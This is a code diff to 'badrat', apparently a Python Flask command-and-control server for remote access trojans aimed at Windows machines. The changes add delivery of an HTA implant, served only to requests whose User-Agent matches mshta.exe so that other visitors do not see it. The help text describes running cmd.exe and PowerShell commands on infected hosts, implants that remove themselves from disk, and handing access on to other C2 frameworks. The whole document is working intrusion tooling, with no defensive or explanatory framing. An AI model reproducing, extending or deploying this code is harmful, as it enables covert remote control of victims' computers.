@@ -81,28 +81,34 @@ def default_page():
     return(htmlify(message))
 
 # Allow rats to call home and request more ratcode of their own type
-def send_ratcode(ratID):
-    if(not rats[ratID]):
-        return(default_page())
-    else:
+def send_ratcode(ratID="", ratType=""):
+    if(ratID):
         # Careful for path traversal vuln... This code may not be 100 percent safe
         with open(os.getcwd() + "/rats/badrat." + types[ratID], 'r') as fd:
             print("\n[*] sending ratcode to " + colors(ratID))
+            return(fd.read())
+    elif(ratType == "hta"):
+        with open(os.getcwd() + "/rats/badrat.hta", 'r') as fd:
+            print("\n[*] sending ratcode to " + colors("hta") + " rat")
             return(fd.read())
 
 def serve_server(port=8080):
     app = Flask(__name__)
 
-    #Disable annoying console output for GET/POST requests
+    # Disable annoying console output for GET/POST requests
     log = logging.getLogger('werkzeug')
     log.disabled = True
 
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['GET'])
-    def gtfo(path):
-        # The rat code uses the POST method ONLY! A GET request is not from a rat
-        print("[!] GET request from non-rat client requested path /" + path)
-        return(default_page())
+    def badrat_get(path):
+        user_agent = request.headers['User-Agent']
+        # Path must be /r/b.hta AND user agent belongs to mshta.exe
+        if(path == "r/b.hta" and "MSIE" in user_agent and ".NET" in user_agent and "Windows NT" in user_agent):
+            return(send_ratcode(ratType="hta"))
+        else:
+            print("[!] GET request from non-rat client requested path /" + path)
+            return(default_page())
 
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['POST'])
@@ -117,7 +123,7 @@ def serve_server(port=8080):
                 ratType = "?"
             username = str(post_dict['un'])
         except:
-            print("[!] Failed to grab id, type, or user param from post request")
+            print("[!] Failed to grab id, type, or user param from POST request")
             return(default_page())
 
         # Update checkin time for an agent every checkin
@@ -137,7 +143,7 @@ def serve_server(port=8080):
 
         # Spawn from HTTP page
         if("req" in post_dict.keys() and post_dict['req'] == "spawn"):
-            return(send_ratcode(ratID))
+            return(send_ratcode(ratID=ratID))
 
         return(htmlify(json.dumps({"cmnd": commands[ratID]})))
 
@@ -167,8 +173,8 @@ def remove_rat(ratID):
             print("[!] Can't delete rat " + ratID + " for some reason")
 
 def get_help():
-    print("\nBadrat is a remote access tool with the goal of being as janky as possible ")
-    print("It is intended to be used as a stage 0 rat, mostly to pass execution to other C2 frameworks")
+    print("\nBadrats is a collection of rats designed for initial access. Rats are designed to be small and have few features.")
+    print("For better post exploit functionality, execution should be passed off to other C2 frameworks")
     print("-------------------------------------------------------------------------")
     print("")
     print("Server commands: -- commands to control the badrat server")
@@ -180,22 +186,21 @@ def get_help():
     print("back -- backgrounds the current rat and goes to the main menu")
     print("remove all -- unregisters ALL rats")
     print("remove <ratID> -- unregisters the specified <ratID>")
-    print("clear -- clear the screen. ")
+    print("clear -- clear the screen")
     print("")
     print("Rat commands: -- commands to interact with a badrat rat")
     print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
     print("spawn -- used to spawn a new rat in a new process.")
-    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe")
+    print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on agent type")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
-    print("The rats are written in Windows JScript and Powershell, run in a wscript.exe or powershell.exe process respectively")
+    print("The rats are written in Windows JScript and Powershell, run in a wscript.exe, mshta.exe, or powershell.exe process")
     print("The server is written in python and uses an HTTP listener for C2 comms")
     print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
-    print("Command output is written to files in the %TEMP% directory, fetched, then the file is deleted")
-    print("Rats try to delete its own code off disk when first started or before quitting. Applies to both double clicked rats and spawned rats.")
-    print("Use absolute paths. Do not cd. Badrat_server does not keep track of current directory")
+    print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
     print("Rat communications are NOT SECURE. Do not send sensitive info through the C2 channel\n")
+    print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
 
 if __name__ == "__main__":
     # Start the Flask server
@@ -245,8 +250,6 @@ while True:
                 get_rats(ratID)
             elif(inp == "clear"):
                 os.system("clear")
-            elif(inp.startswith("cd ")):
-              print("[!] Full paths only! No cd in badrat")
             elif(inp):
                 if(inp == "quit" or inp == "kill_rat"):
                     print("[*] Tasked " + colors(ratID) + " to " + colors("commit Seppuku"))
